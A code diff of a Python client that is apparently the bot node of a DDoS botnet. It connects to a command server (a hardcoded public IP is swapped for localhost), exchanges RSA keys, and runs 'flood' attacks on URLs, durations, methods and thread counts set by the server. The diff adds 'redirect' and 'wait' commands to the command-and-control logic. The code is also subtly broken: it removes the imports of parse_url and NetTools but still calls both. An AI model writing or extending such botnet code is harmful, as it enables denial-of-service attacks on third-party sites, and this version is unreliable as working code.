@@ -3,34 +3,31 @@ import logging
 import time
 import json
 from .crypto import Crypto
-from . import parse_url, NetTools
-from .logger import LoggerFormatter
+from .logger import getLogger
 
-#  Client Class 
+# Client Class
 class Client:
-    def __init__(self, server_host='16.171.206.152', server_port=547, debug=True):
+    def __init__(self, server_host='127.0.0.1', server_port=547, debug=True):
         self.server_host = server_host
         self.server_port = server_port
         self.crypto = Crypto()
         self.private_key, self.public_key = self.crypto.generate_rsa_keys()
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock = None
+        self.redirects = 0
+        self.max_redirects = 5
         self.running = True
 
         # Setup logging
-        self.logger = logging.getLogger("node")
-        self.logger.setLevel(logging.DEBUG if debug else logging.WARNING)
-        if not self.logger.handlers:
-            ch = logging.StreamHandler()
-            ch.setLevel(logging.DEBUG if debug else logging.WARNING)
-            ch.setFormatter(LoggerFormatter())
-            self.logger.addHandler(ch)
+        self.logger = getLogger("Client", debug)
 
-    #  Connect to server 
+    # Connect to server
     def connect(self):
-        while self.running:
+        while self.running and self.redirects < self.max_redirects:
             try:
-                # Connect to server
+                # Create and connect socket
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.connect((self.server_host, self.server_port))
+                self.logger.info(f"Connected to server ({self.server_host}:{self.server_port})")
 
                 # Receive server public key
                 length_bytes = self._recv_n_bytes(2)
@@ -71,15 +68,26 @@ class Client:
                 # Start listening for messages from server
                 self._listen_server()
 
-            except (ConnectionRefusedError, TimeoutError, ConnectionError, OSError) as e:
+            except (ConnectionRefusedError, socket.timeout, ConnectionError, OSError) as e:
                 self.logger.warning(f"Connection failed: {e}. Retrying in 5 seconds...")
-                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 time.sleep(5)
+            except json.JSONDecodeError as e:
+                self.logger.error(f"JSON decode error: {e}")
+                self.close()
+                break
             except Exception as e:
                 self.logger.error(f"Unexpected error: {e}")
+                self.close()
                 break
+            finally:
+                if self.sock:
+                    try:
+                        self.sock.close()
+                    except Exception as e:
+                        self.logger.debug(f"Error closing socket: {e}")
+                    self.sock = None
 
-    #  Listen for server messages 
+    # Listen for server messages
     def _listen_server(self):
         try:
             while self.running:
@@ -116,39 +124,81 @@ class Client:
                 self.logger.info(f"Sent ACK for message: {message}")
 
                 # Process action
-                msg_json = json.loads(message)
-                action = msg_json.get("action")
-                self.logger.info(f"Executing server commands")
-                if action == "flood":
-                    NetTools().run_attack(
-                        parse_url(msg_json["data"]["url"]),
-                        int(msg_json["data"]["duration"]),
-                        msg_json["data"]["method"],
-                        int(msg_json["data"]["threads"])
+                try:
+                    msg_json = json.loads(message)
+                    action = msg_json.get("action")
+                    self.logger.info(f"Processing action: {action}")
+
+
+                    if action == "flood":
+                        NetTools().run_attack(
+                            parse_url(msg_json["data"]["url"]),
+                            int(msg_json["data"]["duration"]),
+                            msg_json["data"]["method"],
+                            int(msg_json["data"]["threads"])
                     )
-                elif action in ["ping", "status", "ack"]:
-                    self.logger.debug(f"Ignoring action: {action}")
-                else:
-                    self.logger.warning(f"Unknown action: {action}")
+
+                    if action == "redirect":
+                        current_node = f"{self.server_host}:{self.server_port}"
+                        new_host = msg_json["data"]["host"]
+                        new_port = msg_json["data"]["port"]
+                        new_node = f"{new_host}:{new_port}"
+                        if new_node != current_node:
+                            self.server_host = new_host
+                            self.server_port = new_port
+                            self.redirects += 1
+                            self.logger.info(f"Redirecting to {new_node}")
+                            self.sock.close()
+                            self.connect()  # Reconnect to new server
+                        else:
+                            self.logger.warning("Redirect to same node; closing")
+                            self.close()
+
+                    elif action == "wait":
+                        wait_s = msg_json["data"]["s"]
+                        self.logger.info(f"Waiting for {wait_s} seconds")
+                        self.sock.close()
+                        time.sleep(wait_s)
+                        self.connect()  # Reconnect after wait
+
+                    elif action in ["ping", "status", "ack"]:
+                        self.logger.debug(f"Ignoring action: {action}")
+
+                    else:
+                        self.logger.warning(f"Unknown action: {action}")
+
+                except KeyError as e:
+                    self.logger.error(f"Missing key in message data: {e}")
+                except json.JSONDecodeError as e:
+                    self.logger.error(f"Invalid JSON in message: {e}")
 
         except Exception as e:
-            self.logger.error(f"Error in listening thread: {e}")
+            self.logger.error(f"Error in listening loop: {e}")
 
         finally:
-            self.sock.close()
+            if self.sock:
+                self.sock.close()
+                self.sock = None
             self.logger.info("Connection closed")
 
-    #  Helper: Receive exact number of bytes 
+    # Helper: Receive exact number of bytes
     def _recv_n_bytes(self, n):
         data = b''
         while len(data) < n:
-            chunk = self.sock.recv(n - len(data))
-            if not chunk:
+            try:
+                chunk = self.sock.recv(n - len(data))
+                if not chunk:
+                    return None
+            except socket.timeout:
+                self.logger.warning("Socket recv timeout")
                 return None
             data += chunk
+            print(data)
         return data
 
-    #  Close client 
+    # Close client
     def close(self):
         self.running = False
-        self.sock.close()
+        if self.sock:
+            self.sock.close()
+            self.sock = None
